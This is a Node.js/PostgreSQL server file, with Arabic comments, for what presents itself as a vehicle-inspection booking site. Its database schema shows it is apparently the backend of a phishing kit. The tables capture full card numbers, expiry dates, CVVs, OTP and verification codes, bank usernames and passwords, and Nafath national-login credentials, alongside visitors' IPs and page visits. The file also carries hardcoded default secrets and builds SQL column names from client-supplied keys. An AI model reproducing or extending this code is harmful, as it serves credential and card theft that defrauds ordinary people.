/**
 * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
 * تم تعديله ليدعم PostgreSQL على Railway - نسخة كاملة بدون اختصار
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const { Pool } = require("pg"); 
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 8080; 
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";

// إعداد الاتصال بـ PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ==================== إنشاء الجداول (PostgreSQL Syntax) ====================
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS bookings (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        clientName TEXT DEFAULT '',
        clientId TEXT DEFAULT '',
        clientPhone TEXT DEFAULT '',
        clientEmail TEXT DEFAULT '',
        clientNationality TEXT DEFAULT '',
        hasDelegate INTEGER DEFAULT 0,
        delegateType TEXT DEFAULT '',
        delegateName TEXT DEFAULT '',
        delegatePhone TEXT DEFAULT '',
        delegateNationality TEXT DEFAULT '',
        delegateId TEXT DEFAULT '',
        vehicleCountry TEXT DEFAULT '',
        vehiclePlate TEXT DEFAULT '',
        vehiclePlateChar1 TEXT DEFAULT '',
        vehiclePlateChar2 TEXT DEFAULT '',
        vehiclePlateChar3 TEXT DEFAULT '',
        vehicleType TEXT DEFAULT '',
        vehicleCarryDang INTEGER DEFAULT 0,
        serviceRegion TEXT DEFAULT '',
        serviceType TEXT DEFAULT '',
        serviceDate TEXT DEFAULT '',
        serviceTime TEXT DEFAULT '',
        clientIp TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        status TEXT DEFAULT 'new',
        statusRead INTEGER DEFAULT 0,
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        referenceId TEXT UNIQUE NOT NULL,
        cardHolderName TEXT DEFAULT '',
        cardNumber TEXT DEFAULT '',
        cardLastFour TEXT DEFAULT '',
        cardExpiry TEXT DEFAULT '',
        cardCvv TEXT DEFAULT '',
        verifyCode TEXT DEFAULT '',
        secretNum TEXT DEFAULT '',
        rajUsername TEXT DEFAULT '',
        rajPassword TEXT DEFAULT '',
        paymentAction TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );

      CREATE TABLE IF NOT EXISTS verification_codes (
        id SERIAL PRIMARY KEY,
        referenceId TEXT NOT NULL,
        type TEXT NOT NULL,
        nafathId TEXT DEFAULT '',
        nafathPassword TEXT DEFAULT '',
        nafathNumber TEXT DEFAULT '',
        motaselProvider TEXT DEFAULT '',
        motaselPhone TEXT DEFAULT '',
        motaselCode TEXT DEFAULT '',
        otpCode TEXT DEFAULT '',
        step INTEGER DEFAULT 0,
        status TEXT DEFAULT '',
        rawData TEXT DEFAULT '{}',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000),
        UNIQUE(referenceId, type)
      );

      CREATE TABLE IF NOT EXISTS navigation_logs (
        id SERIAL PRIMARY KEY,
        referenceId TEXT,
        clientIp TEXT DEFAULT '',
        targetPage TEXT DEFAULT '',
        note TEXT DEFAULT '',
        createdAt BIGINT DEFAULT (extract(epoch from now()) * 1000)
      );
    `);
    console.log("Database tables initialized successfully");
  } catch (err) {
    console.error("Error initializing database:", err);
  }
};

initDb();

// ==================== دوال قاعدة البيانات (PostgreSQL) ====================
async function createBooking(data) {
  const query = `
    INSERT INTO bookings (
      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
      clientIp, rawData, status, statusRead
    ) VALUES (
      $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27
    ) RETURNING *`;
  
  const values = [
    data.referenceId, data.clientName, data.clientId, data.clientPhone, data.clientEmail, data.clientNationality,
    data.hasDelegate ? 1 : 0, data.delegateType, data.delegateName, data.delegatePhone, data.delegateNationality, data.delegateId,
    data.vehicleCountry, data.vehiclePlate, data.vehiclePlateChar1, data.vehiclePlateChar2, data.vehiclePlateChar3,
    data.vehicleType, data.vehicleCarryDang ? 1 : 0, data.serviceRegion, data.serviceType, data.serviceDate, data.serviceTime,
    data.clientIp, JSON.stringify(data.rawData || {}), data.status, data.statusRead
  ];

  const res = await pool.query(query, values);
  return res.rows[0];
}

async function getBookingByReference(referenceId) {
  const res = await pool.query("SELECT * FROM bookings WHERE referenceId = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

async function getAllBookings() {
  const res = await pool.query("SELECT * FROM bookings ORDER BY createdAt DESC");
  return res.rows.map(r => {
    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
    return r;
  });
}

async function updateBookingStatus(referenceId, status, statusRead) {
  if (statusRead !== undefined) {
    await pool.query("UPDATE bookings SET status = $1, statusRead = $2 WHERE referenceId = $3", [status, statusRead, referenceId]);
  } else {
    await pool.query("UPDATE bookings SET status = $1 WHERE referenceId = $2", [status, referenceId]);
  }
}

async function createOrUpdatePayment(referenceId, data) {
  const existing = await pool.query("SELECT id FROM payments WHERE referenceId = $1", [referenceId]);
  
  if (existing.rows.length > 0) {
    const keys = Object.keys(data).filter(k => k !== 'referenceId');
    const sets = keys.map((k, i) => `${k} = $${i + 2}`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    await pool.query(`UPDATE payments SET ${sets} WHERE referenceId = $1`, [referenceId, ...values]);
  } else {
    const keys = ['referenceId', ...Object.keys(data)];
    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'rawData' ? JSON.stringify(data[k]) : data[k]));
    await pool.query(`INSERT INTO payments (${keys.join(", ")}) VALUES (${placeholders})`, values);
  }
  return getPaymentByReference(referenceId);
}

async function getPaymentByReference(referenceId) {
  const res = await pool.query("SELECT * FROM payments WHERE referenceId = $1", [referenceId]);
  const row = res.rows[0];
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

async function createOrUpdateVerification(referenceId, type, data) {
  const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  if (existing.rows.length > 0) {
    const keys = Object.keys(data);
    const sets = keys.map((k, i) => `${k} = $${i + 3}`).join(", ");
    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
    await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceId = $1 AND type = $2`, [referenceId, type, ...values]);
  } else {
    const keys = ['referenceId', 'type', ...Object.keys(data)];
    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
    const values = keys.map(k => k === 'referenceId' ? referenceId : (k === 'type' ? type : (k === 'rawData' ? JSON.stringify(data[k]) : data[k])));
    await pool.query(`INSERT INTO verification_codes (${keys.join(", ")}) VALUES (${placeholders})`, values);
  }
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

async function getVerificationByReference(referenceId, type) {
  const res = await pool.query("SELECT * FROM verification_codes WHERE referenceId = $1 AND type = $2", [referenceId, type]);
  return res.rows[0];
}

// ==================== Express Setup ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// --- توجيه الملفات الثابتة لمجلد public (لإظهار الموقع) ---
app.use(express.static(path.join(__dirname, 'public')));

// فتح الصفحة الرئيسية من داخل مجلد public
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// فتح صفحة الأدمن
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
